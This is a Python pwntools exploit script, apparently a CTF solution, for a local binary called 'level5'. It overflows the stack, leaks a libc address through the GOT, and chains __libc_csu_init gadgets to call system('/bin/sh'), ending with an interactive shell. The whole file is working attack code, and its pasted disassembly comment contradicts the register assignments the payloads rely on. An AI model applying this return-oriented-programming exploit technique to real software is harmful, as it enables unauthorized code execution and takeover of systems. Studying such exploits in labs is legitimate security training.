#!/usr/bin/python 
from pwn import *
from time import sleep

p = process('level5')
elf = ELF('level5')
libc = ELF('libc.so.6')

main_addr = elf.functions['main'].address
log.info("main_addr = " + hex(main_addr))

bss_addr = elf.bss()
log.info("bss_addr = " + hex(bss_addr))

write_got = elf.got['write']
log.info("write_got = " + hex(write_got))

read_got = elf.got['read']
log.info("read_got = " + hex(read_got))

system_libc = libc.symbols['system']
log.info("system_libc = " + hex(system_libc))

write_libc = libc.symbols['write']
log.info("write_libc = " + hex(write_libc))

  # 400610:       4c 89 ea                mov    rdx,r13
  # 400613:       4c 89 f6                mov    rsi,r14
  # 400616:       44 89 ff                mov    edi,r15
  # 400619:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
  # 40061d:       48 83 c3 01             add    rbx,0x1
  # 400621:       48 39 eb                cmp    rbx,rbp
  # 400624:       75 ea                   jne    400610 <__libc_csu_init+0x40>
  # 400626:       48 83 c4 08             add    rsp,0x8
  # 40062a:       5b                      pop    rbx
  # 40062b:       5d                      pop    rbp
  # 40062c:       41 5c                   pop    r12
  # 40062e:       41 5d                   pop    r13
  # 400630:       41 5e                   pop    r14
  # 400632:       41 5f                   pop    r15
  # 400634:       c3                      ret    

p6r = 0x40062a

print p.readline()

# write(1, write_got, 8) 
payload1 =  "A" * 136 + p64(p6r) + p64(0)
rbx = 0x0
rbp = 0x1
r12 = write_got  # call   QWORD PTR [r12+rbx*8] [!] not write_plt
r13 = 1
r14 = write_got  
r15 = 8
ret = 0x400610   # mov    rdx,r13
payload1 += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)
ret = main_addr
payload1 += "\x00" * 56 + p64(ret)

p.send(payload1)
log.info("--payload-1->-->-->-->biu~--\n")
sleep(1)

data = p.recv(8)
write_addr = u64(data)
log.info("! recv : " + str(data))

system_addr  = write_addr - write_libc + system_libc
log.info("system_addr = " + hex(system_addr))

p.readline()

# read(0, bss_addr, 8) <== '/bin/sh\0'
payload2 =  "B" * 136 + p64(p6r) + p64(0)
rbx = 0x0
rbp = 0x1
r12 = read_got  # call   QWORD PTR [r12+rbx*8] [!] not write_plt
r13 = 0
r14 = bss_addr 
r15 = 16		# system_addr + '/bin/sh\0'
ret = 0x400610  # mov    rdx,r13
payload2 += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)
ret = main_addr
payload2 += "\x00" * 56 + p64(ret)

p.send(payload2)
log.info("--payload-2-@--@--@--@diu~--\n")
sleep(1)

p.send(p64(system_addr))
p.send('/bin/sh\0')
sleep(1)

p.recvuntil("Hello, World\n")

# system(bss_addr) <== '/bin/sh\0'
payload3 =  "C" * 136 + p64(p6r) + p64(0)
rbx = 0x0
rbp = 0x1
r12 = bss_addr   # system_addr
r13 = bss_addr+8 # '/bin/sh\0'
r14 = 0xdeadbeef
r15 = 0xdeadbeef
ret = 0x400610   # mov    rdx,r13
payload3 += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(ret)
ret = main_addr
payload3 += "\x00" * 56 + p64(ret)

p.send(payload3)
log.info("--payload-3-o-->--o-->piu~--\n")
sleep(1)

p.interactive()
